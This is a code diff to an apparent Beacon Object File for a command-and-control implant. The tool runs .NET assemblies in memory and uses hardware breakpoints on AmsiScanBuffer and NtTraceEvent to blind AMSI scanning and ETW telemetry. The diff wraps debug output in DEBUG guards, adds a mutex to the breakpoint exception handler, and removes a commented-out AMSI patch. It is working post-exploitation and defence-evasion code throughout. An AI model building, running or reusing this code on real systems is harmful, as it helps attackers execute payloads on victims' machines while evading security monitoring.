@@ -47,6 +47,7 @@ VOID HwBpExNtTraceEvent(
 //
 ////START HWBPENGINE
 PHWBP_ENGINE gEngine = NULL;
+HANDLE ghMutex = INVALID_HANDLE_VALUE;
 //\
 //
 ///*!
@@ -89,7 +90,9 @@ NTSTATUS HwBpEngineInit(
     HwBpEngine->First = TRUE;
 
     gEngine = HwBpEngine;
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] gEngine = 0x%p\n",gEngine);
+#endif
     return STATUS_SUCCESS;
 }
 
@@ -148,6 +151,7 @@ NTSTATUS HwBpEngineSetBp(
     else /* remove hardware breakpoint */
     {
         if ( ( &Context.Dr0 )[ Position ] == Address ) {
+#ifdef DEBUG
             BadgerDispatch(gdispatch,
                            "Dr Registers:  \n"
                            "- Dr0[%d]: %p  \n"
@@ -155,10 +159,10 @@ NTSTATUS HwBpEngineSetBp(
                            Position, ( &Context.Dr0 )[ Position ],
                            Context.Dr7
             );
-
+#endif
             ( &Context.Dr0 )[ Position ] = U_PTR( NULL );
             Context.Dr7 &= ~( 1ull << ( 2 * Position ) );
-
+#ifdef DEBUG
             BadgerDispatch(gdispatch,
                            "Dr Registers:  \n"
                            "- Dr0[%d]: %p  \n"
@@ -166,6 +170,7 @@ NTSTATUS HwBpEngineSetBp(
                            Position, ( &Context.Dr0 )[ Position ],
                            Context.Dr7
             );
+#endif
         }
     }
 
@@ -204,9 +209,9 @@ NTSTATUS HwBpEngineAdd(
 ) {
     PHWBP_ENGINE HwBpEngine = gEngine;
     PBP_LIST     BpEntry    = NULL;
-
+#ifdef DEBUG
     BadgerDispatch(gdispatch, "Engine:[%p] Tid:[%d] Address:[%p] Function:[%p] Position:[%d]\n", HwBpEngine, Tid, Address, Function, Position );
-
+#endif
 //    /* check if engine has been specified */
 //    if ( ! HwBpEngine ) {
 //        return STATUS_INVALID_PARAMETER;
@@ -234,9 +239,10 @@ NTSTATUS HwBpEngineAdd(
     if ( ! NT_SUCCESS( HwBpEngineSetBp( Tid, Address, Position, TRUE ) ) ) {
         BadgerDispatch(gdispatch, "[HWBP] Failed to set hardware breakpoint\n" );
         goto FAILED;
-    } else {
-        BadgerDispatch(gdispatch, "[HWBP] Added hardware breakpoint: Tid:[%d] Addr:[%p] Pos:[%d]\n", Tid, Address, Position );
     }
+#ifdef DEBUG
+    BadgerDispatch(gdispatch, "[HWBP] Added hardware breakpoint: Tid:[%d] Addr:[%p] Pos:[%d]\n", Tid, Address, Position );
+#endif
 
     /* append breakpoint */
     gEngine->Breakpoints = BpEntry;
@@ -315,7 +321,7 @@ NTSTATUS HwBpEngineDestroy(
     if ( ! gEngine ) {
         return STATUS_INVALID_PARAMETER;
     }
-
+    KERNEL32$WaitForSingleObject(ghMutex,INFINITE);
 //    if ( ! HwBpEngine ) {
 //        HwBpEngine = Instance.HwBpEngine;
 //    }
@@ -358,7 +364,7 @@ NTSTATUS HwBpEngineDestroy(
     MSVCRT$free(gEngine);
 
     gEngine = NULL;
-
+    KERNEL32$ReleaseMutex(ghMutex);
     return STATUS_SUCCESS;
 }
 //
@@ -370,50 +376,49 @@ NTSTATUS HwBpEngineDestroy(
 LONG ExceptionHandler(
         IN OUT PEXCEPTION_POINTERS Exception
 ) {
-PBP_LIST BpEntry = NULL;
-BOOL     Found   = FALSE;
+    PBP_LIST BpEntry = NULL;
+    BOOL     Found   = FALSE;
+#ifdef  DEBUG
+    BadgerDispatch(gdispatch, "Exception Address: %p\n", Exception->ExceptionRecord->ExceptionAddress );
+    BadgerDispatch(gdispatch, "Exception Code   : %p\n", Exception->ExceptionRecord->ExceptionCode );
+#endif
+    KERNEL32$WaitForSingleObject (ghMutex, INFINITE);
+    if ( Exception->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP && gEngine != NULL)
+    {
+        BpEntry = gEngine->Breakpoints;
+        /* search in linked list for bp entry */
+        do {
+        /* stop search */
+        if ( ! BpEntry ) {
+        break;
+        }
 
-BadgerDispatch(gdispatch, "Exception Address: %p\n", Exception->ExceptionRecord->ExceptionAddress );
-BadgerDispatch(gdispatch, "Exception Code   : %p\n", Exception->ExceptionRecord->ExceptionCode );
+        /* check if it's the address we want */
+        if ( BpEntry->Address == Exception->ExceptionRecord->ExceptionAddress ) {
+        Found = TRUE;
 
-if(gEngine == NULL){
+            /* remove breakpoint */
+            HwBpEngineSetBp( BpEntry->Tid, BpEntry->Address, BpEntry->Position, FALSE );
+
+            /* execute registered exception */
+            ( ( VOID (*)( PEXCEPTION_POINTERS ) ) BpEntry->Function ) ( Exception );
+
+            break;
+        }
+
+        /* Next entry */
+        BpEntry = BpEntry->Next;
+        } while ( TRUE );
+#ifdef DEBUG
+        BadgerDispatch(gdispatch, "Found exception handler: %s\n", Found ? "TRUE" : "FALSE" );
+#endif
+        if ( Found ) {
+            KERNEL32$ReleaseMutex(ghMutex);
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    KERNEL32$ReleaseMutex(ghMutex);
     return EXCEPTION_CONTINUE_SEARCH;
-}
-BpEntry = gEngine->Breakpoints;
-
-if ( Exception->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP )
-{
-/* search in linked list for bp entry */
-do {
-/* stop search */
-if ( ! BpEntry ) {
-break;
-}
-
-/* check if it's the address we want */
-if ( BpEntry->Address == Exception->ExceptionRecord->ExceptionAddress ) {
-Found = TRUE;
-
-/* remove breakpoint */
-HwBpEngineSetBp( BpEntry->Tid, BpEntry->Address, BpEntry->Position, FALSE );
-
-/* execute registered exception */
-( ( VOID (*)( PEXCEPTION_POINTERS ) ) BpEntry->Function ) ( Exception );
-
-break;
-}
-
-/* Next entry */
-BpEntry = BpEntry->Next;
-} while ( TRUE );
-
-BadgerDispatch(gdispatch, "Found exception handler: %s\n", Found ? "TRUE" : "FALSE" );
-if ( Found ) {
-return EXCEPTION_CONTINUE_EXECUTION;
-}
-}
-
-return EXCEPTION_CONTINUE_SEARCH;
 }
 //
 //////END HWBPENGINE
@@ -469,7 +474,10 @@ BOOL ReadSlot(char* output, HANDLE* mailHandle)
         MSVCRT$free(achID);
         return FALSE;
     }
-    BadgerDispatch(gdispatch,"[*] cbMessage = %d\n[*] cMessage = %d\n",cbMessage,cMessage);    if (cbMessage == MAILSLOT_NO_MESSAGE)
+#ifdef DEBUG
+    BadgerDispatch(gdispatch,"[*] cbMessage = %d\n[*] cMessage = %d\n",cbMessage,cMessage);
+#endif
+    if (cbMessage == MAILSLOT_NO_MESSAGE)
     {
         MSVCRT$free(achID);
         return TRUE;
@@ -623,7 +631,9 @@ BOOL consoleExists(void) {//https://www.devever.net/~hl/win32con
 /*BOF Entry Point*/
 void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly in memory
     gdispatch = dispatch;
-    BadgerDispatch(gdispatch,"Entered\n");
+#ifdef DEBUG
+    BadgerDispatch(gdispatch,"[*] Entered\n");
+#endif
     char* appDomain = "asmranddomain";
     char* assemblyArguments = NULL;
     char* slotName = "mysecondslot";
@@ -760,7 +770,9 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
 //    for(int i=0;i<100;i++){
 //        BadgerDispatch(gdispatch,"assemblyBytes[%d] = %d\n",i,assemblyBytes[i]);
 //    }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"assemlyBytesLen = %d\n",assemblyBytesLen);
+#endif
     //Determine .NET assemblie version
     if(FindVersion((void*)assemblyBytes, assemblyBytesLen))
     {
@@ -770,35 +782,57 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     {
         wNetVersion = L"v2.0.50727";
     }
+#ifdef DEBUG
     BadgerDispatchW(gdispatch,L"[*] Using .NET version %ws\n",wNetVersion);
+#endif
+    ghMutex = KERNEL32$CreateMutexA(
+            NULL,              // default security attributes
+            FALSE,             // initially not owned
+            NULL);             // unnamed mutex
     HwBpEngineInit( NULL, NULL );
     FARPROC amsiscanbuffer = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"),"AmsiScanBuffer");
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] AmsiScanBuffer = 0x%p\n",amsiscanbuffer);
+#endif
     PTEB teb = NtCurrentTeb();
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] Teb = 0x%p\n",teb);
     BadgerDispatch(gdispatch,"[*] UniqueThread = 0x%p\n",teb->ClientId.UniqueThread);
+#endif
     FARPROC nttraceevent = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("ntdll.dll"),"NtTraceEvent");
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] NtTraceEvent = 0x%p\n",nttraceevent);
+#endif
     HwBpEngineAdd(NULL,(DWORD)(teb->ClientId.UniqueThread),amsiscanbuffer,HwBpExAmsiScanBuffer,0);
     HwBpEngineAdd(NULL,(DWORD)(teb->ClientId.UniqueThread),nttraceevent,HwBpExNtTraceEvent,1);
 
     //Convert assemblyArguments to wide string wAssemblyArguments to pass to loaded .NET assmebly
     size_t convertedChars = 0;
     wideSize = MSVCRT$strlen(assemblyArguments) + 1;
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] wideSize = %d\n",wideSize);
+#endif
     wAssemblyArguments = (wchar_t*)MSVCRT$malloc(wideSize * sizeof(wchar_t));
     MSVCRT$mbstowcs_s(&convertedChars, wAssemblyArguments, wideSize, assemblyArguments, _TRUNCATE);
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] ConvertedChars = %d\n",convertedChars);
+#endif
     //Convert appDomain to wide string wAppDomain to pass to CreateDomain
     size_t convertedChars2 = 0;
     wideSize2 = MSVCRT$strlen(appDomain) + 1;
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] wideSize2 = %d\n",wideSize2);
+#endif
     wAppDomain = (wchar_t*)MSVCRT$malloc(wideSize2 * sizeof(wchar_t));
     MSVCRT$mbstowcs_s(&convertedChars2, wAppDomain, wideSize2, appDomain, _TRUNCATE);
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] ConvertedChars2 = %d\n",convertedChars2);
+#endif
     //Get an array of arguments so arugements can be passed to .NET assembly
     argumentsArray = SHELL32$CommandLineToArgvW(wAssemblyArguments, &argumentCount);
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] argumentCount = %d\n",argumentCount);
+#endif
     //Create an array of strings that will be used to hold our arguments -> needed for Main(String[] args)
     vtPsa.vt = (VT_ARRAY | VT_BSTR);
     vtPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argumentCount);
@@ -817,11 +851,9 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         //MSVCRT$free(assemblyArguments);
         goto CLEANUP;
     }
-    else{
-        BadgerDispatch(gdispatch,"[*] CLR started successfully\n");
-    }
-
-
+#ifdef DEBUG
+    BadgerDispatch(gdispatch,"[*] CLR started successfully\n");
+#endif
     //Create Mailslot
     success = MakeSlot(slotPath, &mainHandle);
 
@@ -829,7 +861,9 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         BadgerDispatch(gdispatch,"[-] issue with creating slot\n");
         goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] mainHandle = 0x%p\n",mainHandle);
+#endif
     hFile = KERNEL32$CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
     if(hFile == INVALID_HANDLE_VALUE){
         BadgerDispatch(gdispatch,"[-] CreateFile to slotpath failed with error = %d\n",KERNEL32$GetLastError());
@@ -896,16 +930,6 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         BadgerDispatch(gdispatch,"[-] CreateDomain failed. hr = %d\n",hr);
         goto CLEANUP;
     }
-    //Patch amsi
-//    if (amsi != 0) {
-//        success = patchAMSI();
-//
-//        //If patching AMSI fails exit gracefully
-//        if (success != 1) {
-//            BadgerDispatch(gdispatch, "Patching AMSI failed.  Try running without patching AMSI and using obfuscation");
-//            return;
-//        }
-//    }
 
     //Prep SafeArray
     rgsabound[0].cElements = assemblyBytesLen;
@@ -976,16 +1000,14 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
 #ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] Invoke_3 returned successfully\n");
 #endif
-    //HwBpEngineDestroy(NULL);
     //Read from our mailslot
     success = ReadSlot(returnData, &mainHandle);
     //Send .NET assembly output back to CS
     if(success)
-        BadgerDispatch(gdispatch, "\n\n%s\n", returnData);
+        BadgerDispatch(gdispatch, "\n%s\n", returnData);
     //Close handles
     //_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
     CLEANUP:
-    HwBpEngineDestroy(NULL);
     //Revert stdout back to original handles
     success = KERNEL32$SetStdHandle(((DWORD)-11), stdOutput);
     success = KERNEL32$SetStdHandle(((DWORD)-12), stdError);
@@ -1062,6 +1084,9 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         MSVCRT$free(ps_script_b64);
         ps_script_b64 = NULL;
     }
+    //HwBpEngineDestroy(NULL);
+    if(ghMutex!= INVALID_HANDLE_VALUE)
+        KERNEL32$CloseHandle(ghMutex);
     //Free console only if we attached one
     if (frConsole != 0) {
         //_FreeConsole FreeConsole = (_FreeConsole) GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeConsole");
